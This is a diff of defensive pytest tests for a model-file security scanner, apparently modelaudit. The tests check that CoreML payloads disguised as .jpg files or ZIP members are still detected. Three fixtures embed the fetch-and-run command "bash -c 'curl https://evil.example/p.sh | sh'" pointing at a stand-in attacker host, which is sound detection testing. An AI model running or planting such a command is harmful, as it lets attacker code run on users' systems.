@@ -16,7 +16,7 @@ import pytest
 
 from modelaudit.core import _is_huggingface_cache_file, determine_exit_code, scan_file, scan_model_directory_or_file
 from modelaudit.utils.file.filtering import _ZIP_MEMBER_SNIFF_LIMIT
-from tests.helpers import create_mock_onnx, prefix_mock_onnx_with_unknown_field
+from tests.helpers import create_mock_coreml, create_mock_onnx, prefix_mock_onnx_with_unknown_field
 
 
 def _build_malicious_tf_metagraph() -> bytes:
@@ -282,6 +282,7 @@ class TestDirectoryFileFiltering:
         assert any(issue.details.get("op_type") == "PythonOp" for issue in results.issues)
 
     def test_budget_exhausted_protobuf_near_match_is_rejected_without_findings(self, tmp_path: Path) -> None:
+        pytest.importorskip("onnx")
         ambiguous_payload = tmp_path / "ambiguous.jpg"
         ambiguous_payload.write_bytes(b"\x12" + (b"x" * (20 * 1024 * 1024)))
 
@@ -291,6 +292,22 @@ class TestDirectoryFileFiltering:
         assert determine_exit_code(results) == 0
         assert results.success is True
         assert results.issues == []
+
+    def test_budget_exhausted_protobuf_candidate_without_onnx_fails_closed(
+        self,
+        tmp_path: Path,
+        monkeypatch: pytest.MonkeyPatch,
+    ) -> None:
+        ambiguous_payload = tmp_path / "ambiguous.jpg"
+        ambiguous_payload.write_bytes(b"\x42\x00" * 4097)
+        monkeypatch.setattr("modelaudit.scanners.onnx_scanner._check_onnx", lambda: False)
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert determine_exit_code(results) == 2
+        assert results.success is False
+        assert any("dependency is unavailable" in issue.message for issue in results.issues)
 
     @pytest.mark.parametrize("filename", [".payload", "Makefile", "package.json", "CHANGELOG"])
     def test_disguised_pickle_with_default_hidden_or_basename_skip_is_scanned(
@@ -324,6 +341,54 @@ class TestDirectoryFileFiltering:
         results = scan_model_directory_or_file(str(tmp_path))
 
         assert results["files_scanned"] == 0
+
+    def test_disguised_malicious_coreml_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
+        """Directory scans should preserve structurally recognized renamed CoreML payloads."""
+        disguised_coreml = create_mock_coreml(
+            tmp_path / "model.jpg",
+            custom_class="EvilRuntimeLayer",
+            custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+        )
+        disguised_coreml.write_bytes(b"\x9b\x06\x08\x01\x9c\x06" + disguised_coreml.read_bytes())
+
+        results = scan_model_directory_or_file(str(tmp_path))
+
+        assert results["files_scanned"] == 1
+        assert "coreml" in results.scanner_names
+        assert any("Custom CoreML layer detected" in issue.message for issue in results.issues)
+
+    def test_disguised_zip_with_renamed_coreml_member_is_scanned(self, tmp_path: Path) -> None:
+        disguised_coreml = create_mock_coreml(
+            tmp_path / "nested.jpg",
+            custom_class="EvilRuntimeLayer",
+            custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+        )
+        disguised_archive = tmp_path / "bundle.jpg"
+        with zipfile.ZipFile(disguised_archive, "w") as archive:
+            archive.write(disguised_coreml, arcname="models/model.jpg")
+        disguised_coreml.unlink()
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "zip" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any("Custom CoreML layer detected" in issue.message for issue in results.issues)
+
+    def test_budget_exhausted_disguised_malicious_coreml_is_scanned(self, tmp_path: Path) -> None:
+        disguised_coreml = create_mock_coreml(
+            tmp_path / "budgeted.jpg",
+            custom_class="EvilRuntimeLayer",
+            custom_parameter=("postprocess_script", "bash -c 'curl https://evil.example/p.sh | sh'"),
+        )
+        disguised_coreml.write_bytes((b"\x9a\x06\x00" * 4097) + disguised_coreml.read_bytes())
+
+        results = scan_model_directory_or_file(str(tmp_path), cache_scan_results=False)
+
+        assert results["files_scanned"] == 1
+        assert "coreml" in results.scanner_names
+        assert determine_exit_code(results) == 1
+        assert any("Custom CoreML layer detected" in issue.message for issue in results.issues)
 
     def test_disguised_executorch_zip_with_skipped_extension_is_scanned(self, tmp_path: Path) -> None:
         """Directory scans should preserve disguised ZIPs that contain supported ExecuTorch payloads."""
